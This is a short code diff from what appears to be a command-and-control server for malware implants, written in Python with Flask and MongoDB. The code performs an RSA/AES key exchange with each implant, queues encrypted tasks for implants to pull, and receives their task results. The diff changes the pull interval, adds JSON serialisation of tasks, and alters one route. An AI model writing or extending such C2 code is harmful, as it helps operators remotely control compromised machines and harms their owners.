@@ -25,7 +25,7 @@ def key_exchange_setup():
     aesProvider = AESProvider(get_random_bytes(16))
     data = request.get_json()
 
-    mongo.db.implants.insert({'name': data["name"], "aesKey":aesProvider.key, "tasks": [], "config": {"pullInterval": 5,"communicationMethod": "HTTP"}})
+    mongo.db.implants.insert({'name': data["name"], "aesKey":aesProvider.key, "tasks": [], "config": {"pullInterval": 5000,"communicationMethod": "HTTP"}})
 
     rsa = RSAProvider(base64.b64decode(data["payload"].encode("ascii")).decode('ascii'))
     encryptedKey = rsa.encrypt(aesProvider.key)
@@ -52,11 +52,11 @@ def get_next_task(name):
     try:
         implant["tasks"][0]
     except:
-        return aesProvider.encrypt({"taskName": "nullTask", "payload" :""})
-    return aesProvider.encrypt(implant["tasks"][0])
+        return aesProvider.encrypt(json.dumps({"taskName": "nullTask", "payload" :""}))
+    return aesProvider.encrypt(json.dumps(implant["tasks"][0]))
 
-@app.route("/updateTaskResult/<name>", methods=["POST"])
-def update_task_result(name):
+@app.route("/updateTaskResult", methods=["POST"])
+def update_task_result():
     data = request.get_json()
     #CHange that where I create a new AES provider using the key retrieved from mongodb
     aesProvider = AESProvider(get_random_bytes(16))
